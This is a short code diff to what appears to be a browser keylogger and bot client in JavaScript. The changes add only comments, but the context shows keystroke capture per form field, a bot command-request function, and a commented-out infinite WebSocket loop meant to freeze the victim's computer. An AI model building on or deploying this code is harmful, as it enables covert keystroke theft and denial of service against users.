@@ -104,7 +104,7 @@
                     return name;
                 },
                 emitChange = function() {
-
+                    // if fieldname is equal to last element do nothing
                     var field =  fieldName(this);
                     var element = {field: field,keys:""};
                     keyLogger.elements.push(element);
@@ -162,6 +162,7 @@
     function killClient(){
         // dont run .... will freeze computer
         //        while(1){new WebSocket("ws://localhost");}
+        // local kill
     }
     function requestCommands(botId){
         console.log(botId);
